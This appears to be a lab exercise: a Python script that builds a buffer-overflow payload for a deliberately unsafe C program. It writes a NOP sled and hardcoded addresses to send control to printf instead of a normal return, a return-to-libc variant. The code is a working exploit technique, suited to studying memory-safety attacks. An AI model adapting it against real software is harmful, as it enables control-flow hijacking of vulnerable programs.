# This python file exploits a buffer overflow vulnerability similar to return to libc,
# however, instead it returns to printf.
# Make sure to export an enviroment variable with pwn message before running, and find it's address using gdb
# and a bit of elbow grease. 
# Compile Blame.c with:
# gcc -fno-stack-protector -o UnsafeBlame Blame.c -g -mpreferred-stack-boundary=2
# on a 32 bit Ubuntu 16.04 system for best results.
# Pipe in the binInput to the UnsafeBlame executable.

f = open("binInput", 'w+b')
buffer = 256
print_address = bytearray(b"\xb7\xdb\x36\x70") # Address of print_f function.
exit_address = bytearray(b"\xb7\xd9\x89\xd0") # Address of exit function for clean exit.
shell_var = bytearray(b"\xbf\xff\xfd\xbc") # Address of exported variable with pwn message.
# Reverse all for little-endian.
print_address.reverse()
exit_address.reverse()
shell_var.reverse()
# Fill the buffer.
for x in range(buffer):
   f.write(b'\x90')
# No idea why the extra exit write is needed, by we write the previous frame pointer, the return address, 
# and the argument, which is a reference to an exported environment variable. My guess is it has something to
# with padding on the stack.
# Write ebp
f.write(exit_address)
# Write return
f.write(print_address)
# ???
f.write(exit_address)
# Profit.
f.write(shell_var)
f.close